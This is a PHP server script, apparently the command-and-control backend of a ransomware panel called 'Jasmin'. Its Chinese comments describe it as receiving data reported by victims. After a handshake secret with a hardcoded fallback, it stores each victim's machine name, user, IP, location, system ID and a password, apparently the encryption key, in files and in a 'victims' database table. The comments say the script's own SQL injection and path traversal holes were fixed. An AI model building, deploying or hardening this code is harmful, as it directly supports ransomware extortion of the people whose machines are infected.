<?php
/**
 * Handshake — 接收受害者上报数据
 * 修复: PDO预处理防SQL注入, 文件名过滤防路径遍历, 密钥从.env读取
 */
require_once __DIR__ . '/database/db_conection.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['handshake'])) {
    http_response_code(403);
    echo 'You Are Not My Jasmin ! Get Lost.';
    exit;
}

// 从.env读取密钥
$secret = $_ENV['HANDSHAKE_SECRET'] ?? 'jasmin@123';
if (!hash_equals($secret, $_POST['handshake'])) {
    http_response_code(403);
    echo 'Invalid handshake.';
    exit;
}

// 过滤函数: 仅允许字母数字下划线连字符
function sanitize_filename(string $name): string {
    return preg_replace('/[^a-zA-Z0-9_\-]/', '_', $name);
}

$machine_name   = $_POST['machine_name']   ?? '';
$computer_user  = $_POST['computer_user']  ?? '';
$os             = $_POST['os']             ?? '';
$date           = $_POST['date']           ?? '';
$time           = $_POST['time']           ?? '';
$systemid       = $_POST['systemid']       ?? '';
$location       = $_POST['location']       ?? '';
$ip             = $_POST['ip']             ?? '';
$password       = $_POST['password']       ?? '';

// 安全文件名
$safe_machine  = sanitize_filename($machine_name);
$safe_user     = sanitize_filename($computer_user);
$safe_systemid = sanitize_filename($systemid);
$newtime       = date("H-i-s", strtotime($time));

$folder = sanitize_filename($safe_machine . '_' . $safe_user);
$file   = sanitize_filename($newtime . '_' . $safe_systemid) . '.flora';

$base_dir = __DIR__ . '/passwords';
if (!is_dir($base_dir)) {
    mkdir($base_dir, 0750, true);
}
$target_dir = $base_dir . '/' . $folder;
if (!is_dir($target_dir)) {
    mkdir($target_dir, 0750, true);
}
file_put_contents($target_dir . '/' . $file, $password);

// PDO预处理插入
$stmt = $pdo->prepare(
    'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password)
     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password)'
);
$stmt->execute([
    ':machine_name'  => $machine_name,
    ':computer_user' => $computer_user,
    ':os'            => $os,
    ':date'          => $date,
    ':time'          => $time,
    ':ip'            => $ip,
    ':location'      => $location,
    ':systemid'      => $systemid,
    ':password'      => $password,
]);

echo 'handshake completed';
